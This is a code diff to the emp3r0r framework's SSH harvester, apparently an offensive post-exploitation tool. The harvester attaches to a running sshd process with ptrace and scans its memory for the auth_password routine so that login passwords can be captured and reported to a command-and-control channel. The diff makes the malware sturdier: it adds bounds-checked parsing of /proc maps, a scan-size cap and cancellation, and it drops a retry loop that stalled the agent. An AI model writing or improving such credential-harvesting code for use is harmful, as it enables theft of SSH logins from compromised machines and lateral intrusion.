@@ -12,7 +12,6 @@ import (
 	"strconv"
 	"strings"
 	"sync"
-	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -87,6 +86,29 @@ func SshHarvester(cmd *cobra.Command, code_pattern []byte, reg_name string) (err
 	return err
 }
 
+// parseMapRange parses a /proc/<pid>/maps address range field of the form
+// "start-end" (lowercase hex, no 0x prefix) into its bounds. The maps file is
+// target-controlled input, so this returns an error rather than panicking when
+// the separator is missing, a bound is not valid hex, or the range is inverted.
+func parseMapRange(field string) (start, end uint64, err error) {
+	startStr, endStr, ok := strings.Cut(field, "-")
+	if !ok {
+		return 0, 0, fmt.Errorf("invalid address range %q: missing '-' separator", field)
+	}
+	start, err = strconv.ParseUint(startStr, 16, 64)
+	if err != nil {
+		return 0, 0, fmt.Errorf("parsing start of %q: %w", field, err)
+	}
+	end, err = strconv.ParseUint(endStr, 16, 64)
+	if err != nil {
+		return 0, 0, fmt.Errorf("parsing end of %q: %w", field, err)
+	}
+	if end <= start {
+		return 0, 0, fmt.Errorf("invalid address range %q: end not after start", field)
+	}
+	return start, end, nil
+}
+
 func sshd_harvester(pid int, cmd *cobra.Command, code_pattern []byte, reg_name string) {
 	defer c2transport.NotifyC2(cmd, "SSH harvester for sshd session %d done", pid)
 
@@ -114,26 +136,19 @@ func sshd_harvester(pid int, cmd *cobra.Command, code_pattern []byte, reg_name s
 		pend uint64 // end of sshd process
 	)
 	for _, line := range lines {
-		if strings.Contains(line, "/sshd") &&
-			strings.Contains(line, "r-x") {
-			f1 := strings.Fields(line)[0]
-			if len(f1) < 2 {
-				c2transport.NotifyC2(cmd, "error parsing line: %s", line)
-				continue
-			}
-			start := strings.Split(f1, "-")[0]
-			end := strings.Split(f1, "-")[1]
-			ptr, err = strconv.ParseUint(start, 16, 64)
-			if err != nil {
-				c2transport.NotifyC2(cmd, "parsing pstart: %v", err)
-				return
-			}
-			pend, err = strconv.ParseUint(end, 16, 64)
-			if err != nil {
-				c2transport.NotifyC2(cmd, "parsing pend: %v", err)
-				return
-			}
+		if !strings.Contains(line, "/sshd") || !strings.Contains(line, "r-x") {
+			continue
 		}
+		fields := strings.Fields(line)
+		if len(fields) == 0 {
+			continue
+		}
+		start, end, err := parseMapRange(fields[0])
+		if err != nil {
+			c2transport.NotifyC2(cmd, "error parsing line %q: %v", line, err)
+			continue
+		}
+		ptr, pend = start, end
 	}
 	c2transport.NotifyC2(cmd, "Harvester PID is %d", unix.Getpid())
 	c2transport.NotifyC2(cmd, "SSHD process found in 0x%x - 0x%x", ptr, pend)
@@ -173,21 +188,39 @@ func sshd_harvester(pid int, cmd *cobra.Command, code_pattern []byte, reg_name s
 
 	// search for auth_password
 	c2transport.NotifyC2(cmd, "Searching for auth_password")
+	// The scan range is derived from the target's /proc/<pid>/maps, so bound it:
+	// an oversized or crafted mapping must not turn this into an effectively
+	// unbounded ptrace loop. Capping by subtraction keeps ptr+maxScanBytes from
+	// overflowing uint64, which is what made the ptr++ loop un-terminating.
+	const maxScanBytes = 64 << 20 // 64 MiB
+	if pend-ptr > maxScanBytes {
+		c2transport.NotifyC2(cmd, "SSHD code range 0x%x-0x%x exceeds the scan limit, truncating to 0x%x",
+			ptr, pend, ptr+maxScanBytes)
+		pend = ptr + maxScanBytes
+	}
+	found := false
 	for ptr < pend {
+		if SshHarvesterCtx != nil && SshHarvesterCtx.Err() != nil {
+			c2transport.NotifyC2(cmd, "SSH harvester cancelled, stopping code scan")
+			return
+		}
 		_, err := unix.PtracePeekText(pid, uintptr(ptr), word)
 		if err != nil {
-			c2transport.NotifyC2(cmd, "PTRACE_PEEKTEXT searching memory of %d: %v",
-				pid, err)
-			time.Sleep(time.Second)
+			c2transport.NotifyC2(cmd, "PTRACE_PEEKTEXT searching memory of %d at 0x%x: %v",
+				pid, ptr, err)
+			// Do not sleep-and-retry per byte: over a large range that stalls the
+			// agent indefinitely. Stop scanning and report the pattern as missing.
+			break
 		}
 		if bytes.Equal(word, code_pattern) {
 			c2transport.NotifyC2(cmd, "Got a hit (0x%x) at 0x%x", word, ptr)
 			// now pstart is the start of our code pattern
+			found = true
 			break
 		}
 		ptr++
 	}
-	if ptr == pend {
+	if !found {
 		c2transport.NotifyC2(cmd, "code pattern 0x%x not found in memory 0x%x to 0x%x",
 			code_pattern, pstart, pend)
 		return
